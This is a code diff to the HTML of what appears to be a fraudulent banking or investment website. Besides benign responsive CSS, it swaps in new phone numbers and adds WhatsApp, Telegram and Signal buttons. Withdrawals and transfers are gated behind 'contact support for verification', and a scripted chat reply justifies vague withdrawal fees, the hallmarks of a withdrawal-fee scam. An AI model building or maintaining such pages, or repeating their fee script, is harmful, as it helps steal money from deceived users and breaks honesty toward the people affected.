@@ -103,7 +103,9 @@
             box-shadow: 0 6px 20px rgba(0, 212, 255, 0.5);
         }
 
-        /* Navigation */
+        img { max-width: 100%; height: auto; }
+
+/* Navigation */
         nav {
             background: rgba(15, 32, 39, 0.95);
             padding: 1rem 2rem;
@@ -1457,6 +1459,43 @@
             color: #666;
             font-size: 0.9rem;
         }
+    
+        /* Enhanced Responsiveness */
+        @media (max-width: 480px) {
+            .hero h1 {
+                font-size: 1.8rem;
+            }
+            .hero p {
+                font-size: 1rem;
+            }
+            .btn-primary, .btn-secondary {
+                padding: 0.8rem 1.5rem;
+                font-size: 0.9rem;
+            }
+            .logo {
+                font-size: 1.2rem;
+            }
+            .logo-icon {
+                font-size: 1.5rem;
+            }
+            .modal-content {
+                padding: 1.5rem;
+                margin: 10% auto;
+            }
+            .dashboard-header h2 {
+                font-size: 1.5rem;
+            }
+            .balance-amount {
+                font-size: 2rem;
+            }
+            #contactSection h2 {
+                font-size: 2rem;
+            }
+            #contactSection p {
+                font-size: 1rem;
+            }
+        }
+
     </style>
 </head>
 <body>
@@ -1585,7 +1624,13 @@
         <h2 style="font-size: 2.8rem; margin-bottom: 2rem; font-weight: 800;">Contact Us</h2>
         <p style="font-size: 1.1rem; margin-bottom: 1.5rem;">Have questions? Our support team is available 24/7 to assist you.</p>
         <p style="font-size: 1.1rem; margin-bottom: 2rem;">Call us or use the chat widget at the bottom right for immediate assistance.</p>
-        <a href="tel:+1-202-705-4732" style="display: inline-block; background: #00d4ff; color: white; padding: 1rem 2rem; border-radius: 10px; text-decoration: none; font-weight: bold; font-size: 1.05rem; margin-right: 1rem;">📞 +1-202-705-4732</a>
+        
+        <div style="display: flex; justify-content: center; gap: 1rem; flex-wrap: wrap; margin-top: 2rem;">
+            <a href="https://wa.me/message/UQ72FSOHZKOFL1" target="_blank" style="display: inline-block; background: #25d366; color: white; padding: 1rem 2rem; border-radius: 10px; text-decoration: none; font-weight: bold; font-size: 1.05rem; min-width: 200px;">📱 WhatsApp</a>
+            <a href="https://t.me/+12404070805" target="_blank" style="display: inline-block; background: #0088cc; color: white; padding: 1rem 2rem; border-radius: 10px; text-decoration: none; font-weight: bold; font-size: 1.05rem; min-width: 200px;">✈️ Telegram</a>
+            <a href="https://signal.me/#p/+12404070805" target="_blank" style="display: inline-block; background: #3a76f0; color: white; padding: 1rem 2rem; border-radius: 10px; text-decoration: none; font-weight: bold; font-size: 1.05rem; min-width: 200px;">💬 Signal</a>
+        </div>
+
     </div>
 
     <!-- Login Modal -->
@@ -1743,7 +1788,7 @@
             <div class="error-message" id="withdrawError"></div>
             <p style="color: #666; margin-bottom: 1.5rem;">To withdraw funds, please contact our support team for verification and processing.</p>
             <div class="support-contact-info" style="margin-bottom: 1.5rem;">
-                <p><strong>Phone:</strong> +1-202-705-4732</p>
+                <p><strong>Phone:</strong> +1 (240) 407-0805</p>
                 <p><strong>Chat:</strong> Use the chat widget for instant assistance</p>
             </div>
             <button class="btn-submit" onclick="toggleChat(); closeWithdrawModal();">Contact Support via Chat</button>
@@ -1911,7 +1956,7 @@
             <div class="support-contact-info">
                 <h4>📞 Support Required</h4>
                 <p>Once you submit your transfer request, please contact our support team to complete the process.</p>
-                <p><strong>Phone:</strong> +1-202-705-4732 | <strong>Chat:</strong> Use the chat widget</p>
+                <p><strong>Phone:</strong> +1 (240) 407-0805 | <strong>Chat:</strong> Use the chat widget</p>
             </div>
 
             <div class="transfer-form" id="transferForm">
@@ -1980,7 +2025,7 @@
             <div class="support-contact-info">
                 <h4>📞 Support Required</h4>
                 <p>Once you submit your international transfer request, please contact our support team to complete the process.</p>
-                <p><strong>Phone:</strong> +1-202-705-4732 | <strong>Chat:</strong> Use the chat widget</p>
+                <p><strong>Phone:</strong> +1 (240) 407-0805 | <strong>Chat:</strong> Use the chat widget</p>
             </div>
 
             <div class="transfer-form" id="intlTransferForm">
@@ -2718,7 +2763,7 @@ Payment details will be sent to your email shortly.`;
                 addUserMessage(message);
                 input.value = '';
                 setTimeout(() => {
-                    const supportResponse = `Thank you for your message. Our support team will respond shortly.\n\n📞 For urgent matters, please call us: +1-202-705-4732\n\n💡 Regarding Withdrawal Fees:\nWithdrawal fees help us maintain our secure banking infrastructure, advanced fraud prevention systems, 24/7 customer support, and regulatory compliance. Fees vary based on:\n• Withdrawal method (bank transfer, card, etc.)\n• Transaction amount\n• Processing time selected\n\nContact us for specific fee details on your transaction.`;
+                    const supportResponse = `Thank you for your message. Our support team will respond shortly.\n\n📞 For urgent matters, please call us: +1 (240) 407-0805\n\n💡 Regarding Withdrawal Fees:\nWithdrawal fees help us maintain our secure banking infrastructure, advanced fraud prevention systems, 24/7 customer support, and regulatory compliance. Fees vary based on:\n• Withdrawal method (bank transfer, card, etc.)\n• Transaction amount\n• Processing time selected\n\nContact us for specific fee details on your transaction.`;
                     addBotMessage(supportResponse);
                 }, 500);
             }
